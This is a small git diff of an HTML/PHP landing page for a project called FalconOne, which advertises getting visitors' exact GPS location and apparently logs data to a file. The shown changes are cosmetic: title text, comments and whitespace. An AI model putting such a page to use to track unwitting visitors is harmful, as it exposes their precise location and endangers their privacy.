@@ -1,5 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
+
+	
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,7 +11,7 @@
   <link rel="stylesheet" href="styles/main.css">
   <link rel="stylesheet" href="styles/join.css">
   <link rel="stylesheet" href="styles/footer.css">
-  <title>FalconOne v.0.1 | Default Landing Page - Index.html</title>
+  <title>FalconOne v.0.1 | Default Landing Page</title>
 
 <!-- Social Sharing SEO -->
   <meta property="og:title" content="Hello, world!" />
@@ -19,6 +21,7 @@
   <meta property="og:description" content="Get Exact GPS Location of Webpage Visitors with HTML5 Geolocation API and PHP!" />
   <meta property='article:author' content='StrikeVaults' />
 
+<!-- Favicon -->
   <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.iconscout.com/icon/free/png-32/location-62-93995.png" />
 
 </head>
@@ -34,7 +37,7 @@ if(filesize('./l.log') > 3000000) {
 ?>
 
 <body>
-  <!-- template -->
+  <!-- HTML template -->
   <article class="join">
     <div class="join__container">
       <section class="join__message">
